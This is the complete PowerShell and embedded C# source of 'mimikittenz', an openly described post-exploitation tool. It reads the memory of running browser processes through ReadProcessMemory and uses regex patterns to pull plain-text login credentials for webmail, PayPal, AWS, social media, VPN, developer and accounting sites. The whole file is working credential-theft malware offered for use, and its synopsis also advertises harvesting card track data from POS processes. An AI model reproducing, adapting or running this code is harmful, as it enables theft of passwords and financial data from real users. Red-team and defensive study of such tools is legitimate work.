function Invoke-Mimikittenz
{
<#
.SYNOPSIS

mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes. mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to: TRACK2 (CreditCard) data from merchant/POS processes, PII data, Encryption Keys & All the other goodstuff
note: This tool is targeting running process memory address space, once a process is killed it's memory 'should' be cleaned up and inaccessible however there are some edge cases in which this does not happen.

The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target. Currently mimikittenz is able to extract the following credentials from memory:

Webmail: Gmail, Office365, Outlook Web, Accounting, Xero, MYOB, Remote Access, Juniper SSL-VPN, Citrix NetScaler, Remote Desktop Web Access 2012
Developement: Jira, Github, Bugzilla, Zendesk, Cpanel, IHateReverseEngineers
Malwr: VirusTotal, AnubisLabs, Misc

Dropbox:
Microsoft Onedrive, AWS Web Services, Slack, Twitter, Facebook

Author: Jamieson O'Reilly (https://au.linkedin.com/in/jamieson-o-reilly-13ab6470)
Page: https://github.com/putterpanda/mimikittenz/
License: https://creativecommons.org/licenses/by/4.0/


.DESCRIPTION
	
Utilizes Windows function ReadProcessMemory() to extract juicy information from target process memory using regex.

.EXAMPLE

Invoke-Mimikittenz

Custom regex - The syntax for adding custom regex is as follows:
[mimikittenz.MemProcInspector]::AddRegex("<NameOfTarget>","<regex_here>")

Custom target process - Just append your target proccess name into the array:
[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")

.NOTES

Depending on each process cleanup, process generally must be running in order to extract info.
#>


$asciiart = @"
4pSA4pSA4pSA4paQ4paA4paE4pSA4pSA4pSA4pSA4pSA4pSA4paE4paA4paM4pSA4pSA4pSA4paE4paE4paE4paE4paE4paE4paE4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQrilIDilIDilIDilozilpLilpLiloDiloTiloTiloTiloTiloDilpLilpLilpDiloTiloDiloDilpLilojilojilpLilojilojilpLiloDiloDiloTilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCuKUgOKUgOKWkOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWgOKWhOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0K4pSA4pSA4paM4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paE4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paA4paE4pSA4pSA4pSA4pSA4pSA4pSADQriloDilojilpLilpLilojilozilpLilpLilojilpLilpLilpDilojilpLilpLiloDilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilozilIDilIDilIDilIDilIANCuKWgOKWjOKWkuKWkuKWkuKWkuKWkuKWgOKWkuKWgOKWkuKWkuKWkuKWkuKWkuKWgOKWgOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKWhOKWhA0K4paQ4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paM4paE4paI4paS4paIDQrilpDilpLilpLilpLilpJtaW1pa2l0dGVuei0xLjAtYWxwaGHilpLilpLilpLilpLilpLilpLilpLilpLilpLilpDilpLilojiloDilIANCuKWkOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKWgOKUgOKUgOKUgA0K4paQ4paS4paS4paS4paS4paS4paSQ0FOIEkgSEFaIFdBTT/ilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilpLilozilIDilIDilIDilIANCuKUgOKWjOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKUgOKUgA0K4pSA4paQ4paS4paS4paSamFtaWVzb25AZHJpbmdlbnNlYy5jb23ilpLilpLilpLilpLilozilIDilIDilIDilIDilIANCuKUgOKUgOKWjOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkOKUgOKUgOKUgOKUgOKUgOKUgA0K4pSA4pSA4paQ4paE4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paS4paE4paM4pSA4pSA4pSA4pSA4pSA4pSADQrilIDilIDilIDilIDiloDiloTiloTiloDiloDiloDiloDiloTiloTiloDiloDiloDiloDiloDiloDiloTiloTiloDiloDiloDiloDiloDiloDiloTiloTiloDilIDilIDilIDilIDilIDilIDilIDilIA=
"@
$Source2 = @"
using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.IO;

namespace mimikittenz
{
    public class MemProcInspector
    {
        static MemProcInspector()
        {
            InitRegexes();
        }



        public static void SaveToFile(string fileName, List<MatchInfo> matches)
        {
            StringBuilder builder = new StringBuilder();
            foreach (MatchInfo s in matches)
            {
                builder.AppendLine(s.PatternMatch);
            }
            File.WriteAllText(fileName, builder.ToString());

        }

        public static void AddRegex(string name, string pattern)
        {
            regexes.Add(new RegexRecord(name, pattern));
        }

        public static List<RegexRecord> regexes = new List<RegexRecord>();

        public static List<MatchInfo> InspectManyProcs(params string[] procNames)
        {



            List<MatchInfo> lstMatch = new List<MatchInfo>();
            string res = "None";
            foreach (string procName in procNames)
            {
                try
                {

                    Process[] procs = Process.GetProcessesByName(procName);
                    foreach (Process pr in procs)
                    {
                        Process process = pr;

                        res = InspectProc(process, ref lstMatch);

                    }
                }
                catch (Exception ex)
                {
                    res = ex.Message;
                    res = ex.StackTrace;
                }
            }
            List<string> lstToReturn = new List<string>();

            return lstMatch;
        }

        private static void InitRegexes()
        {
            regexes.Clear();
        }



        private static string InspectProc(Process process, ref List<MatchInfo> lstMatch)
        {
            string res = "";
            IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, false, process.Id);
            if (processHandle.ToInt64() == 0)
            {
                int err = Marshal.GetLastWin32Error();

            }

            res = SearchProc(processHandle, ref  lstMatch);
            MInterop.CloseHandle(processHandle);
            return res;
        }

        private static string SearchProc(IntPtr processHandle, ref List<MatchInfo> lstMatch)
        {
            string res = "";
            MInterop.SYSTEM_INFO si = new MInterop.SYSTEM_INFO();
            MInterop.GetSystemInfo(out si);

            long createdSize = 1;
            byte[] lpBuffer = new byte[createdSize];

            Int64 total = 0;

            long regionStart = si.minimumApplicationAddress.ToInt64(); //(BYTE*)si.lpMinimumApplicationAddress;
            bool skipRegion = false;
            bool stop = false;
            //while (regionStart < Math.Min(0x7ffeffff, si.maximumApplicationAddress.ToInt64()) && !stop)
            while (regionStart < si.maximumApplicationAddress.ToInt64() && !stop)
            {
                //MInterop.MEMORY_BASIC_INFORMATION memInfo;
                MInterop.MEMORY_BASIC_INFORMATION memInfo;

                long regionRead = 0;
                long regionSize;
                int resulq = MInterop.VirtualQueryEx(processHandle, (IntPtr)regionStart, out memInfo, (uint)Marshal.SizeOf(typeof(MInterop.MEMORY_BASIC_INFORMATION)));
                if (resulq == 0)
                {
                    //XVERBOSE(L"VirtualQueryEx error %d\n", GetLastError());
                    int err = Marshal.GetLastWin32Error();
                    Marshal.ThrowExceptionForHR(err);
                    break;
                }
                regionSize = (memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64() - regionStart);
                if (MInterop.IsDataRegion(memInfo) == false)
                {

                }
                if (skipRegion)
                {
                    skipRegion = false;
                }
                else
                    if (MInterop.IsDataRegion(memInfo))
                    {

                        if (createdSize < regionSize)
                        {
                            createdSize = regionSize;
                            lpBuffer = new byte[createdSize];
                        }
                        bool resRead = false;
                        try
                        {
                            resRead = MInterop.ReadProcessMemory(processHandle, new IntPtr(regionStart), lpBuffer, regionSize, out regionRead);
                        }
                        catch //(AccessViolationException ex)
                        {
                            resRead = false;
                        }
                        //  result |= SearchRegion(process, regionStart, regionSize, regexData, regionRead, buffer);
                        regionSize = (int)regionRead;
                        if (!resRead)
                        {
                            // looks like the memory state has been altered by the target process
                            // between our VirtualQueryEx and ReadProcessMemory calls ->
                            // learn the size of the changed region and jump over it on the next iteration
                            skipRegion = true;
                            //XVERBOSE(L"Skipping a non-readable region\n");
                        }
                        if (resRead)
                        {
                            List<string> strsTolook = new List<string>();
                            string str1 = UnicodeEncoding.Unicode.GetString(lpBuffer, 0, (int)regionRead);
                            string str11 = UnicodeEncoding.Unicode.GetString(lpBuffer, 0 + 1, (int)regionRead - 1);
                            string str4 = UnicodeEncoding.ASCII.GetString(lpBuffer, 0, (int)regionRead);
                            strsTolook.Add(str1);
                            strsTolook.Add(str4);
                            strsTolook.Add(str11);

                            foreach (RegexRecord regexRec in regexes)
                            {

                                foreach (string str in strsTolook)
                                {
                                    MatchCollection matches3 = regexRec.Regex.Matches(str);
                                    if (matches3.Count > 0)
                                    {
                                        for (int i = 0; i < matches3.Count; i++)
                                            if (matches3[i].Success && IsMatchesContain(lstMatch, matches3[i].Value) == false && IsRegexRecordsContain(matches3[i].Value) == false)
                                            {
                                                MatchInfo m = new MatchInfo();
                                                m.PatternName = regexRec.Name;
                                                m.PatternMatch = matches3[i].Value;

                                                lstMatch.Add(m);
                                            }
                                        res = matches3[0].Value;


                                    }
                                }
                            }


                        }

                        total += regionSize;
                    }
                regionStart += regionSize;
                //stop = IsStop(stopEvent);
            }
            //XVERBOSE(L"Totally searched %lu bytes\n", total);
            //return result;
            return res;
        }

        private static bool IsMatchesContain(List<MatchInfo> matches, string val)
        {
            foreach (MatchInfo item in matches)
            {
                if (string.Compare(item.PatternMatch, val) == 0)
                    return true;
            }
            return false;
        }

        private static bool IsRegexRecordsContain(string pattern)
        {
            foreach (RegexRecord item in regexes)
            {
                if (string.Compare(item.Pattern, pattern) == 0)
                    return true;
            }
            return false;
        }


        const int MAX_PREFIX_LENGTH = 1;
        // the essence
        // estimated upper limit to allocate enough buffers
        const int MAX_MATCH_LENGTH = 1024;

        // the buffer should be large enough to contain at least MAX_CHECK_LENGTH*sizeof(wchar_t) bytes
        const int DEFAULT_SEARCH_BUFFER_SIZE = (10 * 1024 * 1024);
        // the upper limit of the buffer size
        const int MAX_SEARCH_BUFFER_SIZE = (25 * 1024 * 1024);


    }

    public class MatchInfo
    {

        public string PatternName;
        public string PatternMatch;

        // public string ProccesName { get; set; }

    }
    public class RegexRecord
    {
        Regex mRegex;

        protected RegexRecord()
        {

        }

        public RegexRecord(string name, string pattern)
        {
            Name = name;
            Pattern = pattern;
            mRegex = new Regex(pattern);
        }

        public Regex Regex { get { return mRegex; } }



        public string Name;


        public string Pattern;



    }

    public class MInterop
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess,
          IntPtr lpBaseAddress, byte[] lpBuffer, long dwSize, out long lpNumberOfBytesRead);

        public const int PROCESS_WM_READ = 0x0010;
        public const int PROCESS_QUERY_INFORMATION = 0x00000400;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION32
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public short aligment;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
            public short aligment2;
        }

        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        [DllImport("kernel32.dll")]
        public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        public enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }

        public enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }

        internal static bool IsDataRegion(MEMORY_BASIC_INFORMATION memInfo)
        {

            bool res =    // check this is a live (not free/reserved) memory
            (memInfo.State & (uint)StateEnum.MEM_COMMIT) != 0 &&
                // don't examine memory mapped files sections / PE images
                //  (memInfo.Type & (uint)TypeEnum.MEM_PRIVATE) != 0 &&
                // don't read PAGE_GUARD memory to avoid altering target state
            (memInfo.Protect & ((uint)AllocationProtect.PAGE_NOACCESS | (uint)AllocationProtect.PAGE_GUARD)) == 0
            &&
                // make sure the memory is readable
            (memInfo.Protect & ((uint)AllocationProtect.PAGE_READONLY | (uint)AllocationProtect.PAGE_READWRITE |
            (uint)AllocationProtect.PAGE_EXECUTE_READ | (uint)AllocationProtect.PAGE_EXECUTE_READWRITE | (uint)AllocationProtect.PAGE_EXECUTE_WRITECOPY)) != 0;

            return res;
        }

        public enum ProcessAccessTypes
        {
            PROCESS_TERMINATE = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_SET_SESSIONID = 0x00000004,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x00000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            SYNCHRONIZE = 0x00100000,
            PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |
              PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA |
              PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION | STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE
        }
    }
}


"@

$inmem=New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
 $inmem.GenerateInMemory=1
$inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Location))))

Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem

[mimikittenz.MemProcInspector]::regexes.Clear()
#Internet Banking
#Err... Taken out for good measure 

#Web E-mail 

    #Gmail
    [mimikittenz.MemProcInspector]::AddRegex("Gmail","&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie=")


#Web Services

    #Dropbox
    [mimikittenz.MemProcInspector]::AddRegex("Dropbox","login_email=.{1,99}&login_password=.{1,99}&")
    #SalesForce (Needs fix)
    #[mimikittenz.MemProcInspector]::AddRegex("SalesForce","&display=page&username=.{1,32}&pw=.{1,16}&Login=")
    #Office365
    [mimikittenz.MemProcInspector]::AddRegex("Office365","login=.{1,32}&passwd=.{1,22}&PPSX=")
    #Microsoft OneDrive
    [mimikittenz.MemProcInspector]::AddRegex("MicrosoftOneDrive","login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT=")
    #PayPal
    [mimikittenz.MemProcInspector]::AddRegex("PayPal","login_email=.{1,48}&login_password=.{1,16}&submit=Log\+In&browser_name")
    #AWS Web Services
    [mimikittenz.MemProcInspector]::AddRegex("awsWebServices","&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=")
    #Outlook Web 2015
    [mimikittenz.MemProcInspector]::AddRegex("OutlookWeb","&username=.{1,48}&password=.{1,48}&passwordText")
    #Slack
    [mimikittenz.MemProcInspector]::AddRegex("Slack","&crumb=.{1,70}&email=.{1,50}&password=.{1,48}")
    #CitrixOnline
    [mimikittenz.MemProcInspector]::AddRegex("CitrixOnline","emailAddress=.{1,50}&password=.{1,50}&submit")

#Accounting

    #Xero 
    [mimikittenz.MemProcInspector]::AddRegex("Xero ","fragment=&userName=.{1,32}&password=.{1,22}&__RequestVerificationToken=")
    #MYOB
    [mimikittenz.MemProcInspector]::AddRegex("MYOB","UserName=.{1,50}&Password=.{1,50}&RememberMe=")
#SSL-VPN's

    #Juniper SSL-VPN
    [mimikittenz.MemProcInspector]::AddRegex("JuniperSSLVPN","tz_offset=-.{1,6}&username=.{1,22}&password=.{1,22}&realm=.{1,22}&btnSubmit=")


#Social Media

    #Twitter
    [mimikittenz.MemProcInspector]::AddRegex("Twitter","username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me=")
    #Facebook
    [mimikittenz.MemProcInspector]::AddRegex("Facebook","lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=")
    #LinkedIN
    [mimikittenz.MemProcInspector]::AddRegex("LinkedIN","session_key=.{1,50}&session_password=.{1,50}&isJsEnabled")

#Anti-Forensics

    #Malwr
    [mimikittenz.MemProcInspector]::AddRegex("Malwr","&username=.{1,32}&password=.{1,22}&next=")
    #VirusTotal
    [mimikittenz.MemProcInspector]::AddRegex("VirusTotal","password=.{1,22}&username=.{1,42}&next=%2Fen%2F&response_format=json")
    #AnubisLabs
    [mimikittenz.MemProcInspector]::AddRegex("AnubisLabs","username=.{1,42}&password=.{1,22}&login=login")

#Remote Access

    #Citrix NetScaler
    [mimikittenz.MemProcInspector]::AddRegex("CitrixNetScaler","login=.{1,22}&passwd=.{1,42}")
    #Remote Desktop Web Access 2012
    [mimikittenz.MemProcInspector]::AddRegex("RDPWeb","DomainUserName=.{1,52}&UserPass=.{1,42}&MachineType")
    


#Dev Related

    #Jira
    [mimikittenz.MemProcInspector]::AddRegex("JIRA","username=.{1,50}&password=.{1,50}&rememberMe")
    #Redmine
    [mimikittenz.MemProcInspector]::AddRegex("Redmine","username=.{1,50}&password=.{1,50}&login=Login")
    #Github
    [mimikittenz.MemProcInspector]::AddRegex("Github","%3D%3D&login=.{1,50}&password=.{1,50}")
    #Bugzilla
    [mimikittenz.MemProcInspector]::AddRegex("BugZilla","Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}")
    #Zendesk
    [mimikittenz.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
    #Cpanel
    [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")

write-output $matchesFound
}
